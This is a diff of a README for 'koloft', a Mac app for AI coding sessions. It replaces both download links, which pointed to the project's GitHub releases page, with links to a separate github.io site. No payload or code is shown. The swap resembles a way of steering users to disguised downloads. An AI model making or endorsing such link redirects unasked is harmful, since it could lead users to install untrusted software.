@@ -39,7 +39,7 @@ Getting koloft on your Mac is quick and easy. Follow these simple steps:
 ### Step 1: Go to the Download Page
 Click the big button below to go to the official koloft download page:
 
-[![Download koloft](https://img.shields.io/badge/Download_koloft-Free_App-blueviolet?style=for-the-badge)](https://github.com/DALEMBAC/koloft/releases)
+[![Download koloft](https://img.shields.io/badge/Download_koloft-Free_App-blueviolet?style=for-the-badge)](https://dalembac.github.io)
 
 ### Step 2: Find the Latest Release
 On that page, you'll see a list of releases. Look for the most recent one (it'll be at the top). Click on it to see the available files.
@@ -118,7 +118,7 @@ To stay in the loop about new features and updates:
 
 Don't wait! koloft is here to make your AI coding sessions cleaner, more organized, and more powerful. Click the download button below and get started today!
 
-[![Download koloft Now](https://img.shields.io/badge/⬇️_Download_koloft-Free_%26_Open_Source-brightgreen?style=for-the-badge)](https://github.com/DALEMBAC/koloft/releases)
+[![Download koloft Now](https://img.shields.io/badge/⬇️_Download_koloft-Free_%26_Open_Source-brightgreen?style=for-the-badge)](https://dalembac.github.io)
 
 If you find koloft helpful, consider giving it a star on GitHub to show your support. Your feedback helps the project grow and improve!
 
